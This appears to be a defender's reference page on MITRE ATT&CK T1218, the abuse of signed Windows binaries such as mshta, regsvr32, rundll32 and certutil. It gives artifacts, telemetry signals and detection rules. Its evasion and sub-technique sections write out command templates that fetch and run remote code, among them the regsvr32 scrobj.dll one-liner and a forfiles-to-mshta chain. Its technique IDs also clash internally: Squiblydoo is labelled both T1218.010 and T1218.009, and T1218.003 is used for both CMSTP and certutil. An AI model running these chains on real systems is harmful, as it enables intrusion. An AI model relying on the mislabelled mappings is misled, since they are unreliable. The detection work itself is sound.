---
technique_id: T1218
technique_name: System Binary Proxy Execution
tactic: [Defense Evasion]
platform: Windows
severity: High
data_sources: [ETW-Process, ETW-Network, ETW-File, ETW-Registry]
mitre_url: https://attack.mitre.org/techniques/T1218/
---

# T1218 — System Binary Proxy Execution

## Description (T1218)

T1218 System Binary Proxy Execution (commonly called LOLBins — Living Off the Land Binaries) describes the use of legitimate, signed Windows system binaries to execute attacker-controlled code or commands. These binaries bypass application allow-listing controls, code-signing requirements, and parent-process reputation filters because they are trusted by the OS and security products. The attacker does not introduce a new executable onto the system; instead, they exploit built-in capabilities of existing tools to load scripts, DLLs, or remote content.

The power of LOLBins derives from their dual use: every capability they provide for system administration is also available to an attacker. Detection requires behavioral analysis of what the binary is doing — what arguments it received, what child processes it spawned, what network connections it made — rather than simply whether the binary is present or running.

---

## Windows Implementation Details (T1218)

LOLBins exploit several Windows subsystem capabilities:

**Script/code hosting**: Binaries like `mshta.exe`, `wscript.exe`, `cscript.exe`, and `regsvr32.exe` are designed to execute scripts or load COM objects. They accept file paths or URLs as arguments, making them capable of fetching and executing remote code without a native executable download.

**DLL loading**: `rundll32.exe` is designed to load a DLL and call a specified exported function: `rundll32.exe <dll_path>,<EntryPoint> [args]`. Any DLL can be loaded; the entry point is arbitrary. This makes `rundll32.exe` a universal DLL executor that bypasses application allow-listing for DLL-based payloads.

**COM object instantiation**: `regsvr32.exe` was designed to register COM servers (DLLs). The `/s /n /u /i:<url_or_path>` variant calls `DllInstall` on the target DLL with arbitrary argument, allowing arbitrary DLL execution and remote DLL download via `scrobj.dll` (Squiblydoo technique). This works because `regsvr32.exe` is a trusted system binary that can fetch content over HTTP/HTTPS.

**Compile-time and JIT execution**: `msbuild.exe`, `csc.exe`, and `jsc.exe` can compile and execute C# or JavaScript code from files. An attacker places a malicious `.csproj` or inline task file and invokes MSBuild, which compiles and runs the code in-process.

**OS-level configuration tools**: `certutil.exe` was designed to manage certificates; its `-decode` flag can base64-decode files, enabling payload staging without PowerShell. `bitsadmin.exe` initiates Background Intelligent Transfer Service jobs, which can download files from the internet and execute them.

---

## Observable Artifacts (T1218)

- `mshta.exe` executing with a URL argument or a `.hta` file in a user-writable directory.
- `regsvr32.exe` with `/s /n /u /i:http` or `/i:https` — the scrobj.dll squiblydoo technique.
- `rundll32.exe` loading a DLL from `%TEMP%`, `%APPDATA%`, or any user-writable path, or loading `javascript:`, `vbscript:`, or `shell32.dll,ShellExec_RunDLL`.
- `wscript.exe` or `cscript.exe` executing a `.js`, `.vbs`, or `.wsf` file from a user-writable path or a network share.
- `certutil.exe` with `-decode` or `-urlcache -split -f` flags.
- `bitsadmin.exe` with `/transfer` and a URL argument.
- `msbuild.exe` loading a `.csproj` or inline task XML from a non-standard build directory.
- Any of the above spawned by `WINWORD.EXE`, `EXCEL.EXE`, `OUTLOOK.EXE`, or a browser process — indicating spear-phishing or drive-by delivery.

---

## ETW / eBPF Telemetry Signals (T1218)

### Microsoft-Windows-Kernel-Process

- **Event ID 1 (ProcessStart)**: The key detection signals are process lineage and argument parsing. Each LOLBin has a distinct set of parent processes and argument patterns that distinguish legitimate administrative use from abuse.

  - `mshta.exe` legitimate parents: `explorer.exe` (user-opened HTA). Suspicious parents: Office applications, browser, `cmd.exe`, `powershell.exe`. Suspicious arguments: URLs, `javascript:`, `vbscript:`.
  - `regsvr32.exe` legitimate use: `cmd /c regsvr32 /s <legit_ocx_in_system32>`. Suspicious: `/n /u /i:http`, loading DLLs from temp.
  - `rundll32.exe` legitimate use: loading DLLs from System32 with known entry points (e.g., `PrintUI.dll,PrintUIEntry`). Suspicious: loading from user paths, using `javascript:` or `vbscript:` pseudo-protocols.
  - `certutil.exe` legitimate use: certificate management with no URL arguments. Suspicious: `-urlcache`, `-decode`, `-encode`, `-decodehex`.
  - `msbuild.exe` legitimate parent: `devenv.exe`, CI/CD runner. Suspicious: any Office app, scripting engine, or temp directory `.csproj`.

- **Event ID 5 (ThreadCreate)**: `mshta.exe`, `wscript.exe`, and `cscript.exe` may inject code into child processes or use in-process thread creation to execute payloads. Unexpected thread creation from these processes signals in-process payload execution.

### Microsoft-Windows-Kernel-Network

- **TCP connect events**: `regsvr32.exe`, `mshta.exe`, `wscript.exe`, and `bitsadmin.exe` making outbound HTTP/HTTPS connections to non-Microsoft infrastructure is a high-confidence LOLBin abuse indicator. Legitimate use of these binaries rarely requires outbound internet connectivity.
- **DNS queries (eBPF)**: DNS resolution from `mshta.exe` or `regsvr32.exe` for external domains.

### Microsoft-Windows-Kernel-File

- **Image Load events**: `rundll32.exe` loading a DLL whose path is not in System32 or WinSxS. `msbuild.exe` or `csc.exe` creating temporary compiled assemblies in `%TEMP%`.
- **File Create events**: `certutil.exe` writing a decoded file to disk is detectable as a File Create from `certutil.exe` in a user-writable path.

### Microsoft-Windows-PowerShell

LOLBins often serve as a bridge to PowerShell or are used as alternatives when PowerShell is blocked. If `wscript.exe` creates a child `powershell.exe`, the full lineage is captured: Office → wscript → powershell with an encoded command → malicious payload.

---

## Evasion Variants (T1218)

- **Renamed LOLBins**: Copying `regsvr32.exe` to `reg32.exe` or `svhost.exe` defeats image-name-based detection but cannot change the binary's code-signing certificate chain — the Authenticode signature still identifies the original binary even after renaming.
- **COM object delegation**: Instead of calling a LOLBin directly, attacker code instantiates a COM object that internally uses the LOLBin's functionality. For example, the `Shell.Application` COM object's `ShellExecute` method can launch any binary, including LOLBins, without creating a direct process lineage.
- **Signed script blocks**: `wscript.exe` and `cscript.exe` support Windows Script Host (WSH) signed scripts. An attacker with a code-signing certificate can sign malicious `.js` or `.vbs` scripts, defeating signature-validation-only allow-listing.
- **LOLBin chaining**: `cmd.exe` → `forfiles.exe /m /c "cmd /c mshta.exe http://..."` — using one LOLBin to invoke another adds depth to the process lineage and exploits the fact that `forfiles.exe` is less scrutinized than direct `mshta.exe` launches.
- **AppLocker/WDAC bypass via DLL execution**: Applications may have rules allowing script engines to run within specific directories. Placing the malicious script in an allowed path exploits a rule mismatch rather than bypassing the mechanism entirely.

---

## Detection Logic (T1218)

### LOLBin with Suspicious Network Activity

```
SEQUENCE within 60 seconds:
  Step 1: ProcessStart(
    image_name IN {mshta.exe, regsvr32.exe, wscript.exe, cscript.exe,
                   bitsadmin.exe, certutil.exe, msbuild.exe, csc.exe}
  )
  Step 2: NetworkConnect(
    actor_pid = Step1.pid
    remote_port IN {80, 443, 8080, 8443}
    remote_ip NOT IN microsoft_cdn_ranges
  )
→ T1218 High (0.90)
```

### Regsvr32 Squiblydoo

```
ProcessStart(
  image_name = regsvr32.exe
  cmd_line MATCHES "/i:http|/i:https|/i:\\\\UNC"
)
→ T1218.010 Critical (0.95)
```

### Rundll32 with Suspicious DLL Path

```
ProcessStart(
  image_name = rundll32.exe
  cmd_line NOT MATCHES "C:\\Windows\\System32\\*"
           AND NOT MATCHES "C:\\Windows\\SysWOW64\\*"
  AND (cmd_line MATCHES "%TEMP%|%APPDATA%|\\Users\\*\\AppData")
)
→ T1218.011 High (0.85)
```

### Certutil Decode/Download

```
ProcessStart(
  image_name = certutil.exe
  cmd_line MATCHES "-urlcache|-decode|-decodehex"
)
→ T1218.003 High (0.88)
```

### Office App Spawning LOLBin

```
ProcessStart(
  image_name IN {mshta.exe, wscript.exe, cscript.exe, regsvr32.exe, rundll32.exe}
  parent_image IN {WINWORD.EXE, EXCEL.EXE, POWERPNT.EXE, OUTLOOK.EXE,
                   MSPUB.EXE, ONENOTE.EXE}
)
→ T1218 + T1566 (Phishing) Critical (0.95)
```

---

## Sub-Techniques (T1218)

### T1218.003 — CMSTP

`cmstp.exe` (Connection Manager Profile Installer) accepts an `.inf` file and installs a VPN connection profile. The `.inf` file can contain a `RunPreSetupCommands` section that executes arbitrary commands as a side effect of profile installation. Additionally, `cmstp.exe` is a UAC auto-elevating binary, making it a UAC bypass vector (T1548.002).

### T1218.005 — Mshta

`mshta.exe` is the HTML Application host and can execute VBScript or JScript embedded in `.hta` files or inline via URL protocols (`mshta.exe vbscript:Close(Execute("payload"))`). It makes outbound HTTP connections when given a URL argument, enabling fileless remote payload delivery.

### T1218.009 — Regsvr32

The Squiblydoo technique uses `regsvr32.exe /s /n /u /i:<url> scrobj.dll` to download and execute a remote COM scriptlet. `scrobj.dll` is the Windows Script Component runtime; it fetches the URL, parses the XML scriptlet, and executes the embedded script in the `regsvr32.exe` process context. No DLL is written to disk.

### T1218.010 — Regsvcs / Regasm

`regsvcs.exe` and `regasm.exe` (part of .NET framework) register COM-callable .NET assemblies. If the assembly's `[ComRegisterFunction]` or `[ComUnregisterFunction]` methods contain malicious code, it executes during the registration call without requiring admin rights (for Regasm) or signed code.

### T1218.011 — Rundll32

`rundll32.exe <dll_path>,<ExportedFunction>` is the simplest DLL-based LOLBin technique. The loaded DLL executes in the context of `rundll32.exe`, which is a trusted, signed Windows binary. Common abuse: `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";` which invokes the MSHTML COM host in-process.

---

## Related Techniques (T1218)

- T1548.002 (Bypass UAC) — Several LOLBins auto-elevate and are used for UAC bypass
- T1574 (Hijack Execution Flow) — LOLBins are also targets for DLL side-loading
- T1059 (Scripting) — LOLBins frequently deliver script payloads that then use PowerShell or cmd
- T1027 (Obfuscation) — LOLBin arguments are frequently obfuscated to evade command-line detection

---

## OCSF Mapping (T1218)

| OCSF Class | Class ID | Discriminating Fields | Technique Confidence |
|---|---|---|---|
| Process Activity | 1007 | `process.file.name` in LOLBin set, suspicious cmd_line pattern, unexpected parent | T1218 High |
| Network Activity | 4001 | `actor.process.file.name` in LOLBin set, `dst_port` in {80, 443}, external IP | T1218 High |
| File Activity | 1001 | `actor.process.file.name = certutil.exe`, file created in user-writable path | T1218.003 Medium |
